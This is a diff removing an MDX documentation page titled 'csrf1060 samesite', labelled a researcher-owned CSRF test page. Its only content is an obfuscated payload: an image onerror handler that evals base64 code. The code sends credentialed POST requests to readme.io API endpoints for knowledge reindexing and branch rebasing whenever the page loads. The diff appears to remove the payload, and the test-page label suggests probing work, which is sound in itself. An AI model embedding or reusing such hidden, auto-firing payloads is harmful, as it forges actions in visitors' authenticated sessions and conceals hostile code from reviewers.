@@ -1,6 +1,0 @@
----
-title: csrf1060 samesite
----
-CSRF1060 same-site body-less POST test page (researcher-owned).
-
-<HTMLBlock>{`<img src=x id="c1060" onerror="eval(atob('KGZ1bmN0aW9uKCl7dmFyIEI9J2h0dHBzOi8vZmVzYjIucmVhZG1lLmlvL2Zlc2IyL2FwaS1uZXh0L3YyJzt2YXIgbz17bWV0aG9kOidQT1NUJyxtb2RlOiduby1jb3JzJyxjcmVkZW50aWFsczonaW5jbHVkZSd9O1Byb21pc2UuYWxsKFtmZXRjaChCKycvY2hhdC9rbm93bGVkZ2UvaW5kZXgnLG8pLGZldGNoKEIrJy9icmFuY2hlcy8xLjAvcmViYXNlJyxvKV0pLnRoZW4oZnVuY3Rpb24oKXtkb2N1bWVudC50aXRsZT0nQ1NSRjEwNjAtc2VudCd9KS5jYXRjaChmdW5jdGlvbigpe2RvY3VtZW50LnRpdGxlPSdDU1JGMTA2MC1lcnInfSk7fSkoKTsK'))">`}</HTMLBlock>
